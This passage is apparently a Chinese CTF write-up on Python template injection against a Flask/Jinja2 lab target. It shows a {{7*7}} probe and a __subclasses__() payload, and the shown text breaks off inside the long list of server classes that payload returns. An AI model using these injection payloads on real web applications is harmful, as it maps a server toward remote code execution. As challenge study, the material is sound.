-    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
-<img src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
-
-<p>进入靶机网址提示</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino">python <span class="hljs-keyword">template</span> injection<br></code></pre></td></tr></table></figure>
-
-<p>知道这是一道python模板注入</p>
-<p>url输入 </p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/49 not found<br></code></pre></td></tr></table></figure>
-
-<p>判断存在SSTI注入</p>
-<p>查看网站模块，url输入</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">URL http://<span class="hljs-number">61.147</span><span class="hljs-number">.171</span><span class="hljs-number">.105</span>:<span class="hljs-number">50859</span>/[&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span 